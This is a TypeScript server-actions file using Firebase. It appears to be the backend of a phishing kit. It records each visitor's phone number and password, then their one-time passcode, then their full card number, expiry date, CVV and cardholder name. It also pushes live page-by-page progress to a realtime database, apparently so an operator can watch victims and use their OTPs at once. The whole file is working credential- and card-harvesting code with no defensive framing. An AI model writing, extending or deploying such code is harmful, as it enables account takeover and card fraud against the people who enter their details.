"use server"

import { db, database } from "./firestore"
import { collection, addDoc, updateDoc, doc, serverTimestamp } from "firebase/firestore"
import { ref, set, serverTimestamp as rtdbTimestamp } from "firebase/database"

export interface VisitorData {
  sessionId: string
  phone?: string
  password?: string
  otp?: string
  cardNumber?: string
  expiryDate?: string
  cvv?: string
  cardholderName?: string
  currentPage: string
  createdAt?: Date
  updatedAt?: Date
}

// Create a new visitor session
export async function createVisitorSession(sessionId: string) {
  try {
    const docRef = await addDoc(collection(db, "orders"), {
      sessionId,
      currentPage: "login",
      hasPersonalInfo: false,
      hasCardInfo: false,
      notificationCount: 0,
      time: new Date().toLocaleTimeString("ar-SA"),
      createdAt: serverTimestamp(),
      updatedAt: serverTimestamp(),
    })

    // Also update Realtime Database for live updates
    await set(ref(database, `visitors/${sessionId}`), {
      docId: docRef.id,
      currentPage: "login",
      timestamp: rtdbTimestamp(),
    })

    return { success: true, docId: docRef.id }
  } catch (error) {
    console.error("Error creating session:", error)
    return { success: false, error }
  }
}

// Update visitor login data
export async function updateVisitorLogin(docId: string, sessionId: string, phone: string, password: string) {
  try {
    await updateDoc(doc(db, "orders", docId), {
      name: phone,
      phone,
      password,
      hasPersonalInfo: true,
      currentPage: "otp",
      notificationCount: 1,
      time: new Date().toLocaleTimeString("ar-SA"),
      updatedAt: serverTimestamp(),
      personalInfo: {
        phone,
        password,
      }
    })

    // Update Realtime Database
    await set(ref(database, `visitors/${sessionId}`), {
      docId,
      currentPage: "otp",
      phone,
      timestamp: rtdbTimestamp(),
    })

    return { success: true }
  } catch (error) {
    console.error("Error updating login:", error)
    return { success: false, error }
  }
}

// Update visitor OTP
export async function updateVisitorOTP(docId: string, sessionId: string, otp: string) {
  try {
    await updateDoc(doc(db, "orders", docId), {
      otp,
      currentPage: "card",
      notificationCount: 2,
      time: new Date().toLocaleTimeString("ar-SA"),
      updatedAt: serverTimestamp(),
    })

    // Update Realtime Database
    await set(ref(database, `visitors/${sessionId}`), {
      docId,
      currentPage: "card",
      otp,
      timestamp: rtdbTimestamp(),
    })

    return { success: true }
  } catch (error) {
    console.error("Error updating OTP:", error)
    return { success: false, error }
  }
}

// Update visitor card info
export async function updateVisitorCard(
  docId: string,
  sessionId: string,
  cardNumber: string,
  expiryDate: string,
  cvv: string,
  cardholderName: string
) {
  try {
    await updateDoc(doc(db, "orders", docId), {
      hasCardInfo: true,
      currentPage: "complete",
      notificationCount: 3,
      time: new Date().toLocaleTimeString("ar-SA"),
      updatedAt: serverTimestamp(),
      cardInfo: {
        cardNumber,
        expirationDate: expiryDate,
        cvv,
        cardholderName,
      }
    })

    // Update Realtime Database
    await set(ref(database, `visitors/${sessionId}`), {
      docId,
      currentPage: "complete",
      timestamp: rtdbTimestamp(),
    })

    return { success: true }
  } catch (error) {
    console.error("Error updating card:", error)
    return { success: false, error }
  }
}

// Update current page
export async function updateVisitorPage(docId: string, sessionId: string, page: string) {
  try {
    await updateDoc(doc(db, "orders", docId), {
      currentPage: page,
      time: new Date().toLocaleTimeString("ar-SA"),
      updatedAt: serverTimestamp(),
    })

    // Update Realtime Database
    await set(ref(database, `visitors/${sessionId}`), {
      docId,
      currentPage: page,
      timestamp: rtdbTimestamp(),
    })

    return { success: true }
  } catch (error) {
    console.error("Error updating page:", error)
    return { success: false, error }
  }
}
